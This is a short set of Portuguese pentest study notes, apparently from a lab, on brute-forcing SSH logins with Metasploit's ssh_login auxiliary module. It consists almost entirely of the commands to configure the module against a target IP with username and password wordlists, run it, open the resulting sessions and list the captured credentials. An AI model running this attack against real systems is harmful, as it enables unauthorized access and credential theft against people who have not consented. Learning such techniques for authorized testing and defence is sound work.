<h2 align="center">Ataques de forca bruta</h2>

Suponhamos que a gente queira fazer um brute force no [[SSH]] .

Podemos limitar o tipo da nossa busca para o modo auxiliar

```ad-info
Se voce nao souber oque o modulo faz utilize o comando `info`
```

```
search type:auxiliary ssh

# utilizando o modulo
use auxiliary/scanner/ssh/ssh_login
show options
```

Uma coisa ao se atentar eh o campo `REQUIRED`

```sh
set RHOSTS 172.16.1.7
set THREADS 10
set USER_FILE /opt/users.txt
set PASS_FILE /opt/pass.txt
set VERBOSE true
show options
run
```

Ver sessoes ativas do brute : `sessions`
Acessar sessao:

```sh
sessions
sessions -i <ID>
```

Ver credenciais da sessao ativa:

```sh
creds
```